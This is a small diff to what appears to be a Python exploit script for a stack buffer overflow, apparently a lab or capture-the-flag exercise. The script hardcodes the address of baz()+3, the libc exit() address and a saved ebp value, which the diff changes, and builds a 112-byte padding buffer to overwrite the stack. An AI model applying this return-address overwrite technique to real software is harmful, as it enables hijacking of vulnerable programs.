@@ -6,7 +6,7 @@ def tobytes (value):
 
 baz_skip_addr  = 0x080485b1  # Address of baz() + 3
 exit_addr      = 0xb7e369d0  # Address of exit()
-ebp_foo        = 0xbfffeb48  # ebp value of the current stack frame
+ebp_foo        = 0xbfffeb08  # ebp value of the current stack frame
 
 content = bytearray(0xaa for i in range(112))
 
